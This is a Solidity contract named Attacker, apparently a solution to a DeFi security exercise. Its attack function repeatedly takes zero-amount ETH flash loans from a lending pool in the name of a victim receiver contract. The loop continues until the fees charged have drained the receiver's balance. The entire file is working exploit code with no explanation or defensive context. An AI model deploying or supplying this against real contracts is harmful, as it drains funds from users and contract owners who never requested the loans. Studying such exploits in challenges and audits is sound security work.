// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    function attack(address pool, address receiver) external {
        uint256 fee = IERC3156FlashLender(pool).flashFee(ETH, 0);
        while (receiver.balance >= fee) {
            IERC3156FlashLender(pool).flashLoan(
                IERC3156FlashBorrower(receiver),
                ETH,
                0,
                bytes("")
            );
        }
    }
}